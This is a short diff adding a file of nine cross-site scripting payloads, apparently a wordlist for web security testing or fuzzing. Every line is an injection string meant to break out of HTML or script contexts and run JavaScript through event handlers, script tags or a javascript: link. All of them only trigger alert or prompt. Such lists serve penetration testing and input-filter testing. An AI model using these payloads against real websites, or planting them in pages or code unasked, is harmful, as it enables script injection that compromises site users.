@@ -1,0 +1,9 @@
+'-alert(1)-'
+<img src/onerror=prompt(8)>
+"><svg onload=alert(1)//
+*/alert(1)</script><script>/*
+"><script>alert("hello")</script>
+<math><brute xlink:href=javascript:alert(1)>click 
+<a onmousedown="alert(1)">test</a>
+<abbr onkeydown="alert(1)" contenteditable>test</abbr>
+<audio onmousedown="alert(1)">test</audio>
